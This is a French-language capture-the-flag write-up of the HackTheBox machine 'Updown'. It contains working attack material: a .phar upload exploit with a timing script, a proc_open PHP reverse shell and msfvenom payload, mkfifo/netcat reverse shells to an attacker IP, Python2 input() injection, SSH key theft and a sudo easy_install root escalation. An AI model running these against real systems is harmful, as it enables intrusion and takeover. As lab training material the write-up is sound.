---
title: HTB | Updown
description: UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper. The Pivot consists of injecting code into a SUID Python script and obtaining a shell as the developer user, who may run easy_install with Sudo, without a password. This can be leveraged by creating a malicious python script and running easy_install on it, as the elevated privileges are not dropped, allowing us to maintain access as root.
slug: updown-htb
date: 2025-10-30 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Updown cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Updown</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.177</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap

```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.177
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0=
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI=
|   256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## Foothold

### siteisup.htb - Port 80

### Subdomain dev.siteisup.htb
On trouve une sous-domaine, mais aucune page ne semble accessible ("forbidden").
```bash
gobuster vhost -u "siteisup.htb" -w `fzf-wordlists` --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://siteisup.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /opt/lists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb Status: 403 [Size: 281]
```

### dev/.git - git-dumper
On trouve une dossier dev/.git :
```bash
dirsearch -u http://siteisup.htb/dev 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://siteisup.htb/

[00:47:20] Scanning: dev/
[00:47:22] 301 -   315B - /dev/.git  ->  http://siteisup.htb/dev/.git/
[00:47:22] 200 -    3KB - /dev/.git/
[00:47:22] 200 -   772B - /dev/.git/branches/
[00:47:22] 200 -   298B - /dev/.git/config
[00:47:22] 200 -    73B - /dev/.git/description
...
```

Dans le .git, on trouve un fichier .htaccess nous indiquant qu'un header spécifique permettrait de débloquer l'accès à certaines pages.
```bash
$ git-dumper http://siteisup.htb/dev/ ./git-dump
...
$ cd git-dump
$ cat .htaccess
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

En essayant d'accéder à **dev.siteisup.htb** en ajoutant le header, on obtient l'accès à ce vhost !

### checker.php
On trouve un fichier changelog.txt indiquant qu'une option nous permettant d'upload des fichiers existe.
`changelog.txt`
```bash
cat changelog.txt
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```

En analysant la page disponible sur dev.siteisup.htb et le fichier **checker.php** récupérer dans le .git, on comprend qu'il s'agit bien de la meme page.

Cette page semble contenir une vulnérabilité de type File Upload, nous permettant eventuellement d'executer du code PHP.

### File Upload - PHP RCE
La requete suivante permet d'uploader un fichier PHP avec l'extension **.phar**, qui sera executé correctement comme du php :
```bash
POST / HTTP/1.1
Host: dev.siteisup.htb
Special-Dev: only4dev
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8
Content-Length: 652
Origin: http://dev.siteisup.htb
Connection: keep-alive
Referer: http://dev.siteisup.htb
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8
Content-Disposition: form-data; name="file"; filename="shell.phar"
Content-Type: application/x-php

http://google.com
http://siteisup.com
http://10.10.10.10
http://google.com
http://google.com
http://siteisup.com
http://10.10.10.10
http://google.com
http://google.com
http://siteisup.com
http://10.10.10.10
http://google.com

<?php
echo file_get_contents( "/etc/passwd" );
?>

------geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8
Content-Disposition: form-data; name="check"

Check
------geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8--
```

Le code source de **checker.php** récupérer dans le **.git**, nous montre que les fichiers sont uploader dans un dossier du nom de:
> md5(time())

On a donc créer le code bash suivant, afin de retrouver rapidement le fichier shell.phar :
`md5.sh`
```bash
#!/bin/bash

timestamp=$(date +%s)

for i in {1..10}; do
    t=$(($timestamp-$i))
    md5=$(echo -n $t | md5sum | cut -d' ' -f1)
    #echo $md5
    url='http://dev.siteisup.htb/uploads/'$md5'/'$1
    echo "curl "$url" -H 'Special-Dev: only4dev' -i"
    curl $url -H 'Special-Dev: only4dev' -i
done
```

Ce code **Bash** génère 10 noms de dossiers possible pour les 10 dernières secondes écoulées, puis effectuer des requêtes curl avec ces 10 dossiers vers le fichier shell.phar.

Lors de l'execution de notre requpête Burp, il suffit ensuite d'executer notre script Bash qui va retrouver notre fichier shell.phar et executer le code PHP présent. ATTENTION, dans la requete Burp, il faut rajouter beaucoup de :
> http://google.com
> http://google.com
> ...

au début de la requête.  

En effet, le fichier **shell.phar** est créer uniquement le temps de vérification des URL par le checker.php. Plus on met d'URL, plus le temps d'execution est long et notre fichier n'est pas supprimé.

Dans un premier temps, on a afficher **/etc/passwd** :
> ./md5.sh shell.phar
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
developer:x:1002:1002::/home/developer:/bin/bash
```

### Reverse Shell - proc_open
En regardant la sortie de phpinfo(), on découvre qu'une liste de fonctions est bloqué:
- system, shell_exec, exec...

Les fonctions utilisées habituellement pour executer des commandes et obtenir un reverse shell ne fonctionnent pas.

Cependant, après quelques recherches on trouve le fonction **proc_open** qui n'est pas bloqué et permet d'executer du code :
```bash
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    echo stream_get_contents($pipes[2]);
    fclose($pipes[2]);
    proc_close($process);
}
?>
```

La meilleure technique aurait été de directement généré un reverse shell php à l'aide de **msfvenom**. Ce code php teste 1 par 1 toutes les fonctions permettant l'execution de commandes systèmes :
```bash
msfvenom -p php/reverse_php LHOST=10.10.14.14 LPORT=1337 -f raw > shell.php
```

En utilisant ce code, on obient directement un reverse shell à l'aide de **proc_open**. Le problème avec cette méthode est qu'on ne sait pas forcement quelle fonction à permis d'obtenir le reverse shell.

```bash
$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:49708.
socket_create

whoami
www-data
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.14 1338 >/tmp/f

-------------------
# Better shell

$ nc -lnvp 1338
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1338
Ncat: Listening on 0.0.0.0:1338
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:35496.
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@updown:/var/www/dev/uploads/ab47bcda3749f056619b17b959cdd659$ export TERM=xterm
<ab47bcda3749f056619b17b959cdd659$ export TERM=xterm                   
www-data@updown:/var/www/dev/uploads/ab47bcda3749f056619b17b959cdd659$ ^Z
[1]  + 13292 suspended  nc -lnvp 1338
[exegol-pentest] downloads # stty raw -echo;fg
[1]  + 13292 continued  nc -lnvp 1338

www-data@updown:/var/www/dev/uploads/ab47bcda3749f056619b17b959cdd659$
```

## www-data -> developer

### SUID binary - Python Injection
On trouve un binaire **siteiup**. En l'executant, on se rend compte qu'il interprete directement le code de "siteisup_test.py".
```bash
www-data@updown:/home/developer$ ls
dev  user.txt
www-data@updown:/home/developer$ cd dev
www-data@updown:/home/developer/dev$ ls -lah
total 32K
drwxr-x--- 2 developer www-data  4.0K Jun 22  2022 .
drwxr-xr-x 6 developer developer 4.0K Aug 30  2022 ..
-rwsr-x--- 1 developer www-data   17K Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data   154 Jun 22  2022 siteisup_test.py
```

Dans ce code Python, on observe l'utilisation de la fonction "input". De plus, le code est executé avec Python2 et non pas Python3. Sous Python2, lors de l'utilisation de la fonction "input" Python ne considère pas par défaut qu'il s'agit d'une String, et tente donc de le parser. On peut donc injecter du code python pour ouvrir un reverse shell. Sous Python3, la sortie de input("") est une Str par défaut donc pas d'injection possible :

Payload:
> __import__('os').system('rm /tmp/b;mkfifo /tmp/b;cat /tmp/b|bash -i 2>&1|nc 10.10.14.14 8888 >/tmp/b')

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"

-------------------------

www-data@updown:/home/developer/dev$ ./siteisup         
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('rm /tmp/b;mkfifo /tmp/b;cat /tmp/b|bash -i 2>&1|nc 10.10.14.14 8888 >/tmp/b')
rm: cannot remove '/tmp/b': No such file or directory
```

On obtient un nouveau reverse shell en tant que 'developer'

```bash
$ nc -lnvp 8888 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:45492.
developer@updown:/home/developer/dev$ whoami
whoami
developer
developer@updown:/home/developer/dev$ cd ..
developer@updown:/home/developer$ ls -l .ssh
ls -l .ssh
total 12
-rw-rw-r-- 1 developer developer  572 Aug  2  2022 authorized_keys
-rw------- 1 developer developer 2602 Aug  2  2022 id_rsa
-rw-r--r-- 1 developer developer  572 Aug  2  2022 id_rsa.pub
developer@updown:/home/developer$ cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
........
3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==
-----END OPENSSH PRIVATE KEY-----
```

On trouve la clé SSH de **developer** nous permettant de nous connecter facilement via ce protocole :

```bash
$ vim developer.key
$ chmod 600 developer.key 
$ ssh developer@10.10.11.177 -i developer.key
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64)
....
Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36
developer@updown:~$ cat user.txt 
d235....edcf
```

## developer -> root

### easy_install as root

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

Sur GTFObins, on trouve un chemin d'exploitation pour passer root:  
https://gtfobins.github.io/gtfobins/easy_install/

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF

------------------------

developer@updown:/tmp$ TF=$(mktemp -d)
developer@updown:/tmp$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:/tmp$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.hlSwiYYkel
Writing /tmp/tmp.hlSwiYYkel/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.hlSwiYYkel/egg-dist-tmp-KNZfWR
# whoami
root
# cat /root/root.txt   
7077....3986
```
Il suffit de créer un dossier, avec un fichier setup.py expliquant comment notre module python doit s'installer. On injecte un code malveillant dans ce fichier et il sera executer en tant que root lors du lancement de **easy_install**.